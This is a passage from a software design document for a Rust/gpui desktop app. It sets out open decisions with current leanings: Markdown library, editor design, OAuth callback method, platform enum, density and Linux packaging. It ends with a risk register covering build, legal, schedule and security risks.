1. **Desktop GFM library: `pulldown-cmark` vs `comrak`.** Both are Rust CommonMark/GFM parsers. `comrak` has fuller GFM extension coverage (task lists, strikethrough, autolinks) closer to cmark-gfm (what iOS uses), which favors byte-parity; `pulldown-cmark` is lighter/faster and event-based (easier to drive incremental rendering). **Leaning: `comrak`** for parity-fidelity with the iOS/cmark-gfm side of the contract, unless its serialization can't hit byte-parity round-trip on the fixtures. **Decide by the Phase-3 markdown sub-gate.** Related sub-question below.

2. **Editor architecture: full block/WYSIWYG editor vs source-`Input` + live `text::markdown()` preview.** The web editor is WYSIWYG (TipTap); iOS is a block model. The desktop could ship a full WYSIWYG block editor (multi-week, 12.5#1) **or** a pragmatic **source-markdown `Input` + a live rendered preview** using gpui-component's `text::markdown()` renderer (dramatically cheaper, still round-trips perfectly because the source *is* the markdown). **Open question — leaning toward the source+preview approach for v1** to de-risk the tent-pole item, accepting it's a step below web's WYSIWYG feel, with WYSIWYG as a fast-follow. Decide **before** Phase 3 starts — it changes the whole editor estimate.

3. **OAuth callback mechanism: custom `exp://` scheme vs `127.0.0.1` loopback.** A custom `exp://` URL scheme is clean when the app is **packaged** (registered handler) but **fails for unpackaged/dev builds** (no registered scheme → the browser can't hand back the token, and dev is where we live for months). A `127.0.0.1` loopback listener works everywhere (packaged and `cargo run`) but requires a **new server-side `redirect=` param on `/api/mobile-oauth-return`** to allow the desktop to specify its ephemeral localhost port. **Leaning: loopback as the primary** (works in dev from day one, robust across Linux where scheme registration is a mess — see EXP-5), which means adding the `redirect=` allowlisted param to the existing `mobile-oauth-return` route in `apps/web`. `exp://` can be an optional packaged-build enhancement later. **Decide by Phase 2** (auth lands there). Coordinate the server change with the web team — it's a small, additive, allowlist-guarded param.

4. **Does the desktop report a new platform enum value?** `coding_sessions` and presence carry a platform/client identifier. **Open question:** does the desktop introduce a new enum value (e.g. `desktop`) in `packages/domain-contract/contract.json`, or reuse `macos`/`linux`? **Leaning: a single new `desktop` value** (the app is one cross-platform surface, not two natives), which is a `contract.json` change + regenerate. Decide in Phase 0 if it affects codegen, else by Phase 6 (presence).

5. **Compact density approach (EXP-2f).** Make the desktop UI more compact than web via either (a) **`font_size` + disciplined `.small()` usage** on gpui-component widgets (their built-in `Size` variants), or (b) **forking the gpui-component `Size` px tables** to define a tighter scale. **Leaning: (a)** — a global smaller base `font_size` + a project convention of `.small()`/compact variants, avoiding a fork we'd have to re-merge on every component bump (ties back to 12.1's coordinated-bump cost). Fork only if `.small()` can't reach the target density. Decide during Phase 1 theming; see [04].

6. **The pin triple (restates 12.1's open question, tracked here too).** Exact **gpui-component release tag** + **matching gpui git rev** + **`rust-toolchain.toml` channel**. Decide in **Phase 0/1**, record in the doc + `rust-toolchain.toml` + workspace `Cargo.toml`.

7. **Linux distribution format + tray/auto-update (restates 12.4).** AppImage vs `.deb` vs tarball; whether a system tray and in-app auto-update ship in v1. **Leaning: AppImage primary + tarball fallback; no tray, no auto-update in v1.** Decide by Phase 8.

8. **iOS `mintControlTicket`: keep or delete?** During the iOS self-containment pass ([09]), the mac-shared code is removed. **Open question:** does iOS retain any steer-ticket *minting* helper (`mintControlTicket` or equivalent), or is that purely a server responsibility now that the mac publisher is gone? Since all clients consume **server-minted** tickets and never sign locally (12.7), the leaning is **delete** any client-side minting from iOS as dead code. Confirm during Phase 7 that nothing on iOS depends on it before removing.

9. **Does `run_configs` ever become synced shape #15?** v3 ships `run_configs` as **server-only (tRPC), not synced** — matching `repositories`/`project_repositories`/`user_notification_prefs` (the desktop reads them over tRPC, [07]). **Open question:** if cross-device run-config sharing/real-time-sync becomes desirable, does `run_configs` become the **15th Electric shape** (which would require a shape proxy, a client collection, and — critically — reconciling the "synced argv we execute" tension in 12.7 all over again, this time on the real-time path)? **Decision for v1: NO — stays tRPC-only.** Note it as a deliberate future fork, explicitly flagged because promoting it to a shape re-opens the execute-synced-values security question at higher stakes.

### 12.9 Risk register (at a glance)

| # | Risk | Severity | Retired by |
|---|------|----------|-----------|
| 12.1 | gpui/gpui-component pre-1.0 churn; crates.io↔git-rev mismatch won't compile | High (blocks build) | Phase 0/1 pin triple + committed `Cargo.lock` |
| 12.2 | Linux GPU/compositor matrix; `xdg-open` (EXP-5); VM misleads | High | Phase 1 + Phase 8 on **real** Linux GPU |
| 12.3 | Zero-size panics; duplicate element-id node drops | Med (looks like a sync bug) | Phase 1 resize stress + Phase 3 review discipline |
| 12.4 | No bundler/tray/auto-update; Linux runtime-dep bundling; font-kit fork pin | Med | Phase 8 packaging + provenance log |
| 12.5 | Markdown editor (tent-pole), terminal grid, sync port effort | High (schedule) | Phase 3 editor sub-gate / Phase 4 / Phase 2 |
| 12.6 | GPL boundary on Zed terminal (keys/layout_grid/convert_color) | High (legal) | Clean reimpl + `PROVENANCE.md` |
| 12.7 | DB run-config argv + steer inject = execute untrusted values | High (security) | Per-device Trust & Run gate; ticket-perm on inject (Phase 5/6) |
| 12.8 | Nine open questions (editor lib/arch, OAuth, density, pins, distro, platform enum, iOS ticket, shape #15) | Varies | Decisions dated per item above |

The single most important sentence in this section: **the sync engine's EXP-1#13 correctness and the markdown editor are where this project succeeds or slips, and the GPL/security boundaries are where it must not cut corners.** Everything else is scoped and known.
